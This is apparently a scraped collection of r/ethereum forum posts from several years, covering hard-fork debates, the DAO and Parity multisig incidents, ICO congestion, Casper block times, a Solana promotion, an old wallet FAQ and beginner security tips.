> If there truly is one consensus mechanism that is best, why should we not have a large merger between the various projects, come up with the best kind of decentralized computer to push forward as a basis for the crypto-economy, and move forward together under one unified system? In some respects, this seems noble; ‚Äúfragmentation‚Äù certainly has undesirable properties, and it is natural to see ‚Äúworking together‚Äù as a good thing. In reality, however, while more cooperation is certainly useful, and this blog post will later describe how and why, desires for extreme consolidation or winner-take-all are to a large degree **exactly wrong** ‚Äì not only is fragmentation not all that bad, but rather it‚Äôs inevitable, and arguably the only way that this space can reasonably prosper.

I personally admittedly find ETC's social contract, community and raison d'√™tre less exciting and satisfying and would not personally feel the same passion for it that I do for ETH, but this is simply my judgement, and the judgement of the very many members of the community that have voted or otherwise expressed assent to the fork. Anyone who feels sufficiently strongly in the other direction is welcome to focus on the ETC chain, and we will see if it remains viable.

2) But those were just my beliefs and intermediate values. How do we know that this ""let a hundred flowers bloom"" position is actually correct? We can actually discover a lot of facts from the current situation. First of all, though we can see that the price of ETH + ETC has been remarkably stable around $14.3 for the past 2.5 days, despite great volatility in each component. This is still early-stage, but suggests that the value of at least the cryptocurrency component of the ecosystem actually isn't a superlinear function that favors monopoly.

Second, we can see from several sources (including exchange order books, but also public pronouncements [from Barry Silbert](https://twitter.com/barrysilbert/status/757628841938472961) et al) that incoming interest into ETC is actually coming from the bitcoin side even more than it is from the ethereum side. And this is a core tenet of blockchain pluralism: by leaving open an option to join an alternate system if an individual so chooses, you can satisfy the varying needs of larger groups of people.

3) I may as well offer my own views on hard forking. I **do not** believe that using hard forks as a primary paradigm to resolve thefts or to deal with unethical applications is a long-term viable strategy. This time, we got very lucky that the stolen DAO ETH were conveniently stuck in a known address for 35 days. Next time around, the funds will likely be being sold on exchanges before the developers even know it, and the only solution will be a rollback - and Casper will make rollbacks infeasible due to its economic finality mechanism in any case.

3b) ""Evil dapps"" can constantly move their contracts around in ways that evade a necessarily slow-moving hard fork, so while we can annoy them, ""softer"" means of mitigating the harm of such applications must necessarily still be sought out.

3c) The blockchain itself is very far from the eventual vision of a hyper-scalable, efficient and secure world computer and will see several more iterations to move closer to that goal; if you wish you may view Casper as a completely independent blockchain that happens to have a 100% state-copying premine from ETH, and in fact this may even be the cleanest way to implement it in code. I personally was okay with a fork in light of this context, together with a philosophical belief that **a principle does not need to have literally infinite weight in order to have value**.

In the near to mid-term future, I expect that there will be many small applications rather than one big application, and so no single failure will be enough to greatly impact the ecosystem; hence it strikes me as quite unlikely that application rescue hard forks will become a regular thing (note that some disagree; Vlad would love to have hard forks for many more things, though I'll let him defend his own views :) )

At this point, I am hypothetically open to two kinds of application rescue hard forks:

i) A fork in the very unlikely case that the Solidity compiler proves to have a serious bug that puts 5-10 million ETH in danger.  
ii) There has been a medium amount of ether that has been sent to unspendable addresses because users were using buggy ethereum-js libraries that created the address from the public key incorrectly. I would be OK with a change, for example as part of metropolis, that adds a new transaction type that effectively makes the most common categories of such unspendable addresses spendable by their cryptographically provable rightful owners (but I would only be ok with this with broad consensus and even still it's dependent on technical feasibility and tradeoffs in code complexity).

In the future, I suspect that both possibilities will recede over time.

3d) In the short and medium term, we are still under conditions of high technical uncertainty. For example, Vlad and I continue to argue about whether or not a fixed currency supply can offer sufficient incentives through transaction fees alone to secure the network. If we had agreed, for example, to a ""100 million ETH and never a single bit more"" principle on day one, we would have dug ourselves into a rather deep hole if the research ends up showing that low inflation (or something more complex, like _expected_ low deflation but the possibility of low inflation under conditions of low Casper participation) is the only safe way forward. Similarly, ""it is possible to create a contract that lasts forever"" is also something that is economically dangerous to commit to. Hence, principles on these kinds of matters may need to be settled only later.

4) Concerns about moral hazard are, in this case, IMO overblown; on the contrary, despite the fork, I have been extremely impressed by the sheer number of formal verification and other secure contract programming projects that have recently emerged in academia. Writing this from inside the middle of an Ethereum research workshop in Cornell, I am very optimistic that the number of bugs in code will decrease greatly over the next year.

4b) This does however mean that there is now a much larger burden on high-level language developers, and I personally do not have the time or ability to maintain Serpent at a level that I personally find satisfactory. I am personally continuing to use it as a language for experimenting with Casper simulations, but I welcome proposals from the community for how and if it can find a niche in other contexts."
0,ethereum,"I support ""unfreezing"" the parity multi-sig funds as part of the already scheduled Constantinople hardfork. I don't see how this will negatively effect anyone if its slipped into the Constantinople hardfork. Parity looks like shit right now, but these are the early days, and this wont be the last time this happens. The sooner we accept this and decide that as a community we support fixing major issues/bugs/fuck-ups like this (when its safe and easy to do so of course), the sooner we can progress past the negative stigma people have over hardforks that hinders our growth as a whole."
0,ethereum,"We've been working on an uncensorable platform for content creators that uses Ethereum, IPFS and Web Torrents. It's open source and has no token or monetization scheme. We just released the first version. What's special about it:

&#x200B;

Unlike most other content dapps like steemit, dtube, peepeth, bitchute, etc, it does not have a web server layer at all. It runs as a standalone html file on your computer and queries Ethereum directly, which means that even if your content is banned across all web hosting services on the planet, your subscribers will still receive it in their browser.

&#x200B;

How it works:

&#x200B;

1. A content creator publishes a piece of content online (e.g. Youtube, Torrent, etc.)

2. They broadcast a link to this content on the Ethereum network for a small fee (approx. 5c worth of gas)

3. Their subscribers get it on their newsfeed directly from Ethereum for free.

&#x200B;

The newsfeed algorithm is 100% smart contracts, so your subscribers are guaranteed to get all your posts sorted by most recent, forever.

0,ethereum,"To the community Sorry for not being very responsive in social media, we had some very challenging days.

I want to publicly apologize that I didn't find that bug in the DAO Framework 1.0 which was used by the DAO.

I can honestly say, that I gave my best, open sourced the code and approached as many knowledgeable persons that I could find to review it, but it was not enough.
We have learned a lot through this, and are paying a high price.
We are dedicated to do all that is in our power to assist the DAO to recover the funds. Please support the upcoming fork. The work done by geth, ethcore, consensys and many individuals show that as a community we are able to come together and coordinate complex solutions to difficult situations.

I know there are and will be a lot of discussions in this and related threads. I am currently unable to respond to everything because I am working on solutions (https://blog.slock.it/what-the-fork-really-means-6fe573ac31dd#.s4vxq4ryp)."
0,ethereum,"Isn't it a huge issue that recent ICOs are basically a DDoS on the entire Ethereum network? Yes, scalability is a major problem for any blockchain, and yes, Ethereum has a scalability roadmap but still, I didn't think we'd come to this point this soon.

Basically, the recent Bancor and BAT ICOs made the entire blockchain unusable for 3 hours unless you paid extremely high fees. This is just unacceptable.

Think about it: RWE for example uses the public Ethereum chain to manage payments for EV charging. If you want to charge your car and suddenly end up in an ICO, you actually have to wait for a few hours for the ICO to complete.

This is a huge issue to me. Seriously. We need scaling features yesterday!

0,ethereum,"Constantinople Hard Fork Will Be Postponed. Please note that this decision to postpone the Constantinople Hard Fork was done so out of caution and respect for the integrity of the Ethereum ecosystem and its community. Without enough time to analyse the potential impact of the vulnerability, it made ethical sense to stick to the side of caution and to call off committing to an EIP that could potentially put user funds at risk. The Ethereum Core Developers had the opportunity here to sweep this issue under the rug and commit to the Constantinople Hard Fork, as planned, however, I am thoroughly impressed by the virtue that was exercised in this decision to postpone the Constantinople Hard Fork. This is a perfect demonstration of the development force behind Ethereum possessing a strong sense of probity.

EDIT: Here is my personal audio log of emergency Ethereum Core Dev meeting held regarding this matter (this meeting was open to the public), my mic was muted in the meeting but unfortunately not in my recording, sorry if my clicking drives you crazy but I felt it was still worth sharing this here: https://soundcloud.com/revolution0x/constantinople-hardfork-meeting-audio"
0,ethereum,"Pointless Posts A lot of mindless posts from the moon crowd. We are supposed to be ahead of the curve here, so how about some intellectual conversation? I'll start.

So if the world economy becomes majority cryptocurrencies, how extreme do you think the move will be towards an entire United Earth? With a global, transferable currency that moves peer to peer; I would imagine that lots of cross border relationships will be built that could have never found each other before. I see this as the first major step towards a United human race versus each country for their own. 

If that takes hold, what are some future use cases for a platform such as a ethereum (other than Dapps that are currently being developed). In what ways could you think of solving global issues that are hard to solve with our current divided economies? 

I love Eth, and there are some wonderful minds working on projects, but as always more ideas create new innovation. Instead of discussing current prices and moon landings, we should be discussing potential use and get involved with our devs. If we continuously brainstorm, the people with the know how may be inspired?

[https://blog.cryptographyengineering.com/2020/03/06/earn-it-is-an-attack-on-encryption/](https://blog.cryptographyengineering.com/2020/03/06/earn-it-is-an-attack-on-encryption/)"
0,ethereum,"Why should the Parity Multisig Wallet be bailed out when all the other contract mistakes and Ether losses aren't? Millions of dollars have been lost by everyday users since the beginning of time on the Ethereum blockchain. Broken contracts, lost private keys, sending to wrong addresses, are just some ways that users have lost funds. None of these users ""intended"" for these losses to happen. Just like the parity multisig contract wasn't 'intended' to self destruct.

I am truly sympathetic to all the users affected by this bug. But it seems that the only fair course of action here would be an EIP that includes a full bailout of all losses on the Ethereum network since the Genesis block.  It seems to me unfair that only certain contracts should be fixed and not others.

The most upsetting thing about this bailout request is that it does not include losses from the the Parity wallet blank seed phrase bug (not the multisig contract) which resulted in tens of millions of dollars of losses to parity wallet users who were never compensated by Parity.

Parity never bailed out their own users, but a few months later when they lose their own money that they cried foul and asked for a bailout from everyone else. 

That just isn't fair.

If Parity wants to receive the goodwill of the community and perhaps have more support for this EIP, I would suggest updating the EIP to include the following:

* Refunding all losses from their blank seed phrase bug to all users affected.

* Update the EIP to include a bailout from all funds sent to 0x000000000000000000000000000000000000 or other wrong addresses.

* Restore / Fix all bugs in other contracts that have caused losses.
 
When these changes are made so that **everyone is treated fairly**, I think it have more support.

Other things Parity can do to receive more support:

* Promise to bailout other people's losses with the funds they recover from this EIP.  (blank seed phrase bug, other broken contracts, 0x0000, etc).  

* Give half the money to the Ethereum Foundation."
0,ethereum,"Fuck it I am so done with both /r/btc and /r/bitcoin, tell me what Ethereum has that Core, Cash and SegwitX2 don't have. I was watching [this video](https://youtu.be/S7ant_59PHs?t=968)

and then it hit me. Bitcoin was a lot more fun when an normal average day user was able to mine it with CPU and GPU. See I have always believed that the concept of crypto currency when embraced globally can lead to a massive redistribution of wealth but NOT necessarily a more fair one. If anything, the way it is now .. you would easily end up with 10  people owning 99% (hackers and miners) of all bitcoins. 

So to me there are still things that need to fixed with Bitcoin. Such as: how to properly distribute this wealth so that enough people want to stay in the system and not go like: It's not fair anymore, this system is also rigged, goodbye.

So Bitcoin leads to a small rich group of people that are able to mine and make good profit with it and this creates a feedback loop that gives them more and more power to run faster then the rest. That can't be good for decentralization.  I want a crypto that:

* everybody can always mine and still get at least something out of it, does not have to be much, but SOMETHING that keeps people involved and interested and not just from a sideline perspective. 

* an incentive in the form of a reward for actually using it as a currency on a daily basis. Maybe a crypto that is build in to an app that people want to use every day? Something like bittorrent? Bittorrent mainline DTH has between 15 and 30 million nodes on-line on a daily basis, it's the most successful and stable and robust decentralized network that I know of (operating on the internet, which is also a robust and stable decentralized network)  
Interesting fact by the way: Drue Loewenstern inspiration for BitTorrent mainline DHT came from .... Aaron Swartz. (if it ever turn out that Satoshi was Aaron Swart, I would not be supprised) 

* a crypto that  can not be hijacked by a small group of people without the rest being able do defend against the attack. 

* I did not get in to bitcoin because the prospect of staying up all night watching the price go up and down was appealing to me. If anything the whole concept of making money trading stock (because other people loose it) has never appealed to me. Now I am not against that, but that's just not for me. But sadly even I got caught up in the gambling. I turned 400 euros in to 4000 euros in the early days of Bitfinex and then lost it all when I went short and the price rose to much.  One of the ideas that got me in to bitcoin was the idea that everybody in the world with an internet connection would now have equal access to money systems, But that's totally not what bitcoin is right now. 


I have never really fully understood Ethereum. Understanding the bitcoin white paper was already hard enough hard enough and took me weeks. I have never put much effort in trying to understand Ethereum.

So show we what you got! 

edit: Thanks for the discussion and replies. This has been great! Time for another let's-lock-myself-in-for-three-weeks-or-longer-untill-i-understand-this-new-idea like I had in 2011 with Bitcoin. It was really nice reading all the civilized discussions. Made me think about the bitcoin subs before they went to poop.

## Technologies and Apps
* **Do you have to use Meteor for building Dapps?** Not at all! You can use any frontend GUI you prefer (even plain javascript), just connect to your node. We just use it internally for our Dapps and our lead Dapp Developer Fabian has built a [lot of useful tools for that platform](http://atmospherejs.com/ethereum).
* **How do I include web3.js on my apps?** [Here's a primer]( https://github.com/ethereum/wiki/wiki/JavaScript-API#getting-started)

* **Is ethereum based on bitcoin?** No, we use bitcoins underlaying technology, [the blockchain](https://www.youtube.com/watch?v=7Y3fWXA6d5k&amp;index=3&amp;list=PLJqWcTqh_zKHQUFX4IaVjWjfT2tbS4NVk), but Ethereum is a separate Blockchain. Ethereum has one of the first working implementations of [bitcoin side chains](https://www.youtube.com/watch?v=5WGgoVmfIik&amp;index=17&amp;list=PLJqWcTqh_zKHQUFX4IaVjWjfT2tbS4NVk) so you can easily and quickly exchange ether and BTC.

* **What's the future of Ethereum?** We are planning a switch to [Proof of Stake](https://www.youtube.com/watch?v=7Y3fWXA6d5k&amp;index=3&amp;list=PLJqWcTqh_zKHQUFX4IaVjWjfT2tbS4NVk) in the near future. We are also investigating [scalability solutions](https://www.youtube.com/watch?v=7Y3fWXA6d5k&amp;index=3&amp;list=PLJqWcTqh_zKHQUFX4IaVjWjfT2tbS4NVk) and how to [store secrets on the blockchain](https://blog.ethereum.org/2014/12/26/secret-sharing-daos-crypto-2-0/)
* **No, I mean, how can I use ethereum to get information about the future?** [Augur](http://www.augur.net) and [Gnosis](http://groupgnosis.com) are building prediction markets that try to gather the best information about uncertain future events
* **No, but I want to discuss future price movements by scribbling graphs on trading charts!** Then you should [go here](/r/ethtrader) (not moderated by us).
* **How many ethers are there? How is that calculated?** There are about [77 million ethers](http://ethereum.stackexchange.com/questions/443/what-is-the-total-supply-of-ether) in existence and every new block (an average of 15 seconds) creates 5 new ether. This number can never be increased, but could be drastically reduced when we [switch to the more cost effective Casper consensus algorithm](https://blog.ethereum.org/2015/08/01/introducing-casper-friendly-ghost/). 
* **What is 'Gas'?** Every contract has a fixed computational cost that which is the result of which kind of call it executes. These costs are fixed by the protocol level, but to avoid having them fluctuate too much they are set in *gas* instead of *ether*. Every user selects the *gas price* they are willing to pay when they send a transaction or execute a contract and every node is free to accept that price or not, based on their minimum gas price, amount of transactions and other network conditions.


 ## Wallet Questions 


**How do I update my wallet?**

The wallet is an interface to the node. This means you can have multiple copies of the wallet, or overwrite your old copies without a problem 

**How do I backup?**

Open the wallet, go to accounts > backup and save those folders 

**Do I need to download the full Blockchain?**

Yes. Light clients are on the pipeline and before that there are some updates that will optimize and speed up the time it takes. 

**Is it safe to store my ether or import my presale wallet?**

Yes. Of course risk is relative and you should keep your computer protected from malware and wallet backed up. The wallet is still beta but at this point this is more related to crashes and other issues that might make it harder for a non geek to launch the wallet. But the chances of actually loss of ether are relatively small at that point and probably  smaller than an exchange getting hacked "

0,ethereum,"A note on how the latest Casper PoC accomplishes its fast block times safely Many people are wondering how it is the a 3 second block time can possibly be safe, especially in a context where (i) we are also interested in pushing up our blockchain's tx/sec rate, and (ii) the network latency of the internet is a large fraction of 3 seconds already. This is for good reason; my [previous article on block times](https://blog.ethereum.org/2014/07/11/toward-a-12-second-block-time/) suggested that 12 seconds was safe but not much less. And yet, [this happened](https://twitter.com/VitalikButerin/status/760185856057638913). In fact, it turns out that the latency was understated: the above 1% stale rate held true even though the average network latency was 2.2 seconds rather than 1.25 seconds (essentially, I set the per-hop latency, but on average nodes in that simulation were ~1.8 hops away) So, what has changed?

The answer is simple: proof of stake. In proof of work, block creation is what is called a Poisson process - an event that has some very small fixed chance of taking place every millisecond. In a Poisson process with a mean block time of 14.3 seconds, once a block is created there is a 6.75% chance that a block will be created in the next second, a 13.05% chance that a block will be created in the next two seconds, etc. This means that, with a mean network latency of ~0.8 seconds (Ethereum's [approximate average](http://ethstats.net)), once a block is created there is a ~5.44% chance that another block will be created before that block's miner hears about the first new block, leading to the current stale/uncle rate.

Casper is NOT a poisson process. Rather, the way it works is that every block creates a random seed from which we generate a sequence of child validators, where after the first 3 seconds the first validator can generate a block, then the second, etc. This has the benefit that as long as everything can happen within the 3-second window, there should be no problems - a latency of 2.2s should not affect the system at all, though a latency of 4s would be very harmful, though not worse than a latency of 4s would be with a 3-second mean block time PoW.

But we can go further - the above simulation results in fact hold true for network latencies even going all the way up to ~6 seconds (ie. 3.5 seconds per hop). What did we do there? The answer is another clever trick: the time for the primary child of a block to appear with no skips is set to 3 seconds, but the time _between_ skips (ie. the difference between the appearance time of the first and second validator, the second and third, etc) is 6 seconds. So the second validator has to wait 9 seconds to make a block. Fortunately, we can expect bonded validators to be online most of the time, and most of the time the 3-second mark is when blocks get created, but the safety margin we have for network latency is based on the time it takes to get to the second validator. This means that, if more safety is deemed desirable, we may even want to adopt a 3/12 formula (ie. first validator after 3s, second after 15s, etc) to double the network latency tolerance with low decreases in average block time.

Next steps for us: transform the network simulator code into an actual test network running on top of pyethapp."

0,ethereum,"Criticisms of Ethereum from someone who works in the Ethereum Ecosystem After reading Tuur's criticisms [here](https://twitter.com/TuurDemeester/status/1078682801954799617) and discussion about it [here](https://www.reddit.com/r/ethereum/comments/aac4hr/tuurs_criticism_discussion_thread/) i decided to write my own list of criticisms. 

1) In 2017, during the height of the ICO mania, many prominent voices in Ethereum were not vociferously outspoken against the hysteria that occurred, and their unwillingness to do so likely lead to the increased prominence of scams/malicious entities operating in or around the space.

2) The Ethereum Foundation and most other teams working on scaling solutions have done a terrible job of creating educational material or funding people/orgs to create educational material meant for laypersons.

3) The time-table of research/development of core scaling solutions has been, and continues to be, unclear. I understand that research is still being conducted, but it's not hard to keep a road-map updated. 

4) Apathy on topics (especially related to new ETH issuance and the new presence of ASIC miners) by those with influence has led to the loudest voices being the most-visible in conversations/discussions, which discourages constructive discussion.

5) Large organizations operating in the space have been negligent in helping with the adoption of technologies operating on top of Ethereum (namely ENS).

6) The cost of operating a full node on Ethereum is something that is being overlooked. This is being worked on through research into state rent and client improvements. This needs to be a bigger priority though.

7) Projects operating in Ethereum have done a poor job of internationalizing software and funding distribution to areas where it could be useful to people that need it. This doesn‚Äôt extend to all projects, but as a whole we‚Äôve done a poor job of this.

8) A fixation on wealth generation has led to centralization of funds which could have been better-deployed to early-stage startups, or public infrastructure/tools.

9) Most projects operating on Ethereum with the goal of becoming a business have neglected making a self-sustaining business model, resulting in orgs that require perpetual grants.

10) Most projects seem to have written off a usable-UX in favor of complaining about how decentralization is hard.

11) The average person with interests in cryptocurrency is too focused on the increase of their own wealth. This is not what this technology is for.

0,ethereum,"The Venezuelan ""Petro"" is going to be an ERC20 coin. (Proof Inside) Maybe not 100% irrefutable proof, but here's what I found.

First, there's this PDF hosted on what looks like the official Venezuelan government page.

http://minci.gob.ve/wp-content/uploads/2018/01/EL-PETRO-ES-INDEPENDENCIA.pdf

Here's the link to the main site: http://minci.gob.ve/

Now if you know Spanish, you'll notice there's no mention of ""Ethereum"" or ""ERC-20"" in there anywhere, BUT I ended up going to the directory that the PDF is hosted in, and voila:

http://minci.gob.ve/wp-content/uploads/2018/01/

It's open, and there's a ton of files in there, but if you CTRL-F the word ""petro"", you'll notice in your scroll bar that there are 3 sections of files that match. The first section is the PDF I linked to above and some images of the cover, the second section is a set of images called ""Petroleo"", and they're just mining rigs, and then the 3rd section of images are these:

0,ethereum,"A proof-of-concept of a better crowdsale contract I've written up a POC for [an offchain auction-based contract](https://gist.github.com/Arachnid/b9886ef91d5b47c31d2e3c8022eeea27), to start a conversation on better ways to do ICOs.

The way it would work is:

 1. The crowdsale authors deploy the contract and announce the end date.
 2. Users deposit funds with the contract. Funds are held until after the end of the crowdsale.
 3. Users sign a message with a bid price and quantity, and send this privately to the crowdsale authors.
 4. Once the crowdsale is over, the authors set a strike price (about which more below). They also publish all the signed bids, to demonstrate they acted fairly in setting the strike price.
 5. After the strike price is set, either crowdsale authors or bidders can submit their signed bid in order to buy tokens at the strike price (assuming the bid was at least at that price), or to withdraw their deposit if their bid was too low.
 6. A week after the end of the crowdsale, anyone can withdraw their deposit unconditionally.

The strike price is calculated offchain by the crowdsale authors. The exact price isn't determined by consensus, but because the contract won't allow them to take in more than the declared amount of ether, or sell more than the declared number of tokens, the economically efficient result is for them to set the price as expected - to the highest price that brings in the fundraising amount they requested.

This contract is written around a 'capped' model, so the total amount raised is fixed; higher bids mean that the sellers have to give away fewer tokens in return for the funding they requested. An uncapped model would be a fairly trivial modification.

Hey everyone, I‚Äôm Raj Gokal from the **Solana Foundation**. Solana tackled the Scaling Bake-Off this week and **completed the entire 5-day challenge in around 5 minutes for less than $5 USD.**

Here are the benchmarks of our challenge:

* Solana completed token minting in under 2 seconds across 64 threads;
* Solana completed 204,800 token transfers and point claims in 3 minutes, 20 seconds;
* Solana burned 75,520 tokens in 46 seconds;
* All while running on Solana‚Äôs mainnet across 130 geographically-distributed validators.

If you‚Äôre a geek, [you can run this demo for yourself on our mainnet](https://github.com/solana-labs/reddit-scaling-demo). You can even parallelize it on as many machines as you want and run it on mainnet. But if you just want to see it in action, I put together this video to show the entire challenge start to finish and to share a bit more about Solana.

# Play the ‚ÄúBreak‚Äù Game

I invite you to experience the raw speed of Solana for yourself. In addition to the demo, we also built [an interactive demo called ""Break""](https://break.solana.com/) to illustrate Solana‚Äôs speed real time. It‚Äôs simple to play. Just smash keys on your keyboard. Each key sends a real transaction to the Solana mainnet. Every time a block changes color from black to green you know the transaction has been:

1. Sent from the client to the server
2. Forwarded from the server to the the block producer
3. Added to a block and propagated to the network
4. Voted on by everyone in the network
5. Approved by 2/3+ of votes, which is detected by the server
6. Sent back to the client, which gets the notification to turn the box green

Every blockchain claims to be fast, so it‚Äôs really hard to tell what‚Äôs real. A real-time game is the best demo we could come up with to prove to you how fast Solana really is. We‚Äôre also running a competition right now to encourage concurrent usage on the network.

Please make sure to post pictures of your broken keys/keyboards or high scores on r/solana. We‚Äôll give out 1,000 SOLs to the 5 best pictures.

>**Hit me up!** If you‚Äôre short on the SOL required to play, just reply in this thread with your Solana wallet address or with an imgur link to a screenshot with a QR code. Your first game is on us. (Not that it‚Äôs expensive to play anyways. See how long it takes you to burn 1 SOL on break).

# About the Network

**It‚Äôs Live on Mainnet**: Check out [this dashboard](https://solanabeach.io/) built by one of our awesome validators for network stats. So far, the network has grown larger and faster than any other network we‚Äôre aware of:

* 100 days since mainnet
* 25 million blocks
* 1.75 BILLION transactions

**It‚Äôs Cheap, and Fast as Hell:** This network was built for speed by people who used to optimize embedded systems and operating systems for a living. Smart contract transactions are so fast and cheap that we use them for consensus votes!

* $10 for 1 million transactions
* 400ms block times
* \~1.5s confirmation times

**It Only Gets Faster:** We are obsessively focused on horizontally scaling every part of a layer-1 blockchain without sharding. We will never be in a situation where the demand for the network grows so much that we can‚Äôt scale to meet it. Validators can always add more cores, more memory, more SSDs, more network bandwidth, on-demand, when the users need it.

**It‚Äôs Decentralized:** The network has seen a 300% growth of its validators since launch: In March, we launched mainnet with an elite group of 40 validators. To date, we‚Äôve increased that group to over 130 validators actively securing the network. An additional 250 validators on testnet will soon be onboarded to mainnet.

**It‚Äôs Growing:** Since launch, we‚Äôve also announced partnerships with [Kin](https://medium.com/kinblog/solana-migration-foundation-vote-a5803f698f54) (who are moving 3.5m users over from Stellar as we speak), [Serum](https://medium.com/solana-labs/ftx-chooses-solana-for-serum-a-high-speed-non-custodial-decentralized-derivatives-exchange-c346a27c1f2b) (a non-custodial CLOB derivatives exchange that [recently made headlines](https://www.theblockcrypto.com/daily/72924/ftx-dex-serum-solana-blockchain)), [Arweave](https://www.arweave.org/), [Terra](https://www.coindesk.com/solana-blockchain-adds-korean-stablecoin-terra-for-better-payments), [Chainlink](https://cointelegraph.com/news/solana-and-chainlink-team-up-to-build-a-crazy-fast-oracle), [Civic](http://civic.com/), [Akash](https://akash.network/blog/akash-partners-with-solana-to-bring-web-scale-smart-contracts-to-supercloud/), [Fortmatic](https://fortmatic.com/), [Dfuse](https://www.dfuse.io/en/blog/dfuse-announces-a-partnership-with-solana-to-collaborate-on-a-powerful-data-solution-for-its-high-throughput-blockchain), [Hummingbot](https://hummingbot.io/blog/2020-05-solana-liquidity-mining-campaign-coming-soon/), and [more](https://medium.com/solana-labs).

# Scaling Ethereum

As part of helping projects use Solana interoperably with Ethereum, a bunch of people that helped build Solana are also already building super cool wraps and warps to make native Ethereum assets lightning fast using Solana. Two recent examples of this are our friends at [Terra](https://medium.com/terra-money/terra-partners-with-solana-to-establish-low-latency-bridge-expanding-its-stablecoin-ecosystem-to-15883bdbb0fb) and [FTX](https://medium.com/solana-labs/ftx-chooses-solana-for-serum-a-high-speed-non-custodial-decentralized-derivatives-exchange-c346a27c1f2b).

Solana is a Layer-1 blockchain and not positioned as a native Ethereum scaling solution per se.

0,ethereum,"It's time to get real because the market is going up and all the new users here could lose their crypto. Here are the 10 best things you can do to protect yourself & your funds: When markets get exciting, it's time to batten down the hatches. New people are entering the space and will soon be exposed to scams and phishing sites.

##A new crypto user and their crypto are easily parted. 

Here are a few ways to prevent that:


###1. Get a hardware wallet. üõ°Ô∏è
A hardware wallet holds your private key within the device and protects it from being exposed. It's recommended to use a hardware wallet for cold storage (the funds you don't plan to touch).
The two biggest players are [Ledger](https://www.ledgerwallet.com/r/1985?path=/products/) and [Trezor](https://shop.trezor.io/?offer_id=10&aff_id=1735). Both are great.


###2. Browse safely. üåê
Always use bookmarks and never click links, and install an extension like [MetaMask](https://metamask.io/) or [EAL](https://harrydenley.com/ethaddresslookup-chrome-extension-release/) to protect you from known phishing sites.


###3. Never enter your private keys on a website. üîë
One of the most common ways for someone to be parted from their cryptocurrency is via a phishing site, a.k.a. a fake version of a real site. Phishing sites will usually allow you to enter your private key so you can ""access"" your funds, but as soon as you enter your private key they'll send it to their servers, access your funds themselves, and drain your account.

[It's a BAD HABIT to enter your private key into a website](https://medium.com/mycrypto/private-keys-websites-aa85b42113a0). Just don't do it. If you have to use a private key / mnemonic phrase / keystore file, use a [desktop application](https://download.mycrypto.com/) that's away from the browser. Even then, make sure to [verify](https://support.mycrypto.com/staying-safe/verifying-authenticity-of-desktop-app) it's not a fake desktop application.


###4. Turn on 2FA for everything. EVERYTHING. üì≤
 Choose Google Authenticator over Authy. Don't use your phone number. Then, make sure your phone number is NOT tied to your Google account (look in privacy settings). 

[SIM-swapping is real and common](https://medium.com/mycrypto/what-to-do-when-sim-swapping-happens-to-you-1367f296ef4d) and if your phone number is attached to any account recoveries, you could be in real trouble.


###5. Be mindful of where you store your keys. üîê
Don't store your keys on cloud storage like Dropbox. Don't store your keys in your email. Ideally, don't store your keys on any device that's connected to the internet. All of these things can be accessed by bad actors if you're not careful.

Use a hardware wallet, and keep your backups safe on an [air-gapped device](https://www.thesslstore.com/blog/air-gapped-computer/) or in a safe physical location.


###6. Verify everything. üîé
Check the URLs of the websites you're on. 

Check the URLs of the social media accounts you're reading. 

Check the URLs of the GitHub repos you're exploring.

Never download anything from an unverified URL that someone sent you - go find the proper URL at the proper source.

Double- and triple-check everything, especially when you're sending a transaction - read and verify the output addresses. For an extra layer of assurance when sending a transaction, try out [Protected Transactions](https://support.mycrypto.com/general-knowledge/about-mycrypto/what-are-protected-transactions).


###7. Never click on ads/promoted results. üõë
Many times these promoted results are actually promoting scam/fake/phishing sites.


###8. Nobody is giving away ETH. üö´
Ever.
EVER.
If you see someone giving away crypto or saying that you have to send them crypto to get more crypto in return, RUN AWAY. It's not real.


###9. Look out for one another. üíû
If you've been in this space for a while, you know exponentially more than someone who started exploring it. Things move quickly, so it's likely that you're an expert in some of these subjects, and you can share this knowledge to help new users build better habits.

You have the power to help others not screw up. Use that power!


###10. Use your brain. üß†
Always stop and think. 

Don't assume, ask. 

Don't blindly follow, question. 

Patience is truly a virtue.

If something seems too good to be true, it's likely not true.

https://www.etherchain.org/coinvote/poll/35/data

This is a quirk of the terrible design of this coin vote. The vote is not done by sending a tx like carbonvote, but instead just by signing a message. But since a contract can't sign a message, the vote allows the contract creator to sign for it. So here, even though the wallet contract is dead, it's creator can vote with all of its ETH.  Note too, this is a mult-sig contract. So normally accessing its ETH requires the multiple signatures, yet this vote only requires the vote of the creator, which may not even be on the multi-sig.  This makes no sense -- contracts are often held by business or games and their ETH is not at the whim of their creators once deployed. 

The reason ""yes"" is winning has nothing to do with community sentiment.  It is Parity, the original ethereum foundation members now part of parity, and even their own self-destructed wallet voting.  Do not be fooled -- this has nothing to do with ""community"" sentiment! 

Edit: u/veoxxoev has compiled a list of the voting contracts, which are currently voting with about 1M ETH: https://www.reddit.com/r/ethereum/comments/8e33u9/psa_most_of_the_yes_votes_on_eip999_are_from/dxsjy17/

0,ethereum,"I think TheDAO is getting drained right now Unfortunately I am on a train to work, so cannot investigate, but looks like recursive call exploit of some kind"
0,ethereum,"Update on the White Hat attack I hope that I'll be able to write down a more complete blog post at some point, because the full story would make a fascinating read, but right now here's are the main points:

Since Friday I've been in contact with a group of very smart people with the intent on replicating the attack to avoid any more of the ether being bled. Let's call this group, collectively ""Robin Hood"". Everyone in this group acted as an individual and did not represent or received the endorsements of their employers.

Robin had been able to replicate the attack on the testnet but couldn't be sure it would work until it was tested. First it would require the group to successfully stalk and infiltrate multiple split proposals that were open.

After some initial setbacks the group was able to infiltrate all open split proposals and trying to identify the best one to execute. 

The best candidate proposal ended up being [#78](http://etherscan.io/token/thedao-proposal/78) because it didn't have many stalkers and we had identified the curator. We control 3 of the 5 accounts that split with us, if you have any information on who are the other accounts, please contact us so we are able protect the funds.

The group was diverse in their opinions on the fork(s). Some are very strongly anti-any-fork, some are very strong pro-fork and everything in between. Despite our differences, we identified an imminent attack we worked together to prevent it. For that reason everyone was also reticent on doing the White Hat Attack as it could be bad for the recovery efforts on the past hacks. Also, even those in the group that supported the soft fork could agree that we had no idea how long it would take to implement and deploy one.

Today about 19h central european time Robin detected that there was a new attack going on. It was draining slowly, a few ether per round, but it had already amassed a few thousand dollars. It seemed to be someone testing the waters and seeing if it could drain more.

